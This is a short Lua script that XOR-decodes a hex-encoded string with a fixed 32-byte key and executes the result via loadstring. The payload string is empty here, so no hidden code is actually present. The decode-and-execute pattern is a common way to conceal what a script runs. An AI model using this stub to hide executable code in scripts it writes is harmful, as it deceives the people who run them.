local k={136,77,160,39,136,144,212,71,221,101,207,30,254,166,37,171,168,203,78,179,93,102,94,179,27,196,114,253,21,211,227,213}
local s=[[]]
local t={}
local n=0
for i=1,#s,2 do
	n=n+1
	local v=tonumber(s:sub(i,i+1),16)
	t[n]=string.char(bit32.bxor(v,k[((n-1)%#k)+1]))
end
local c=loadstring or load
local fn,err=c(table.concat(t))
if not fn then error(tostring(err),0) end
return fn()
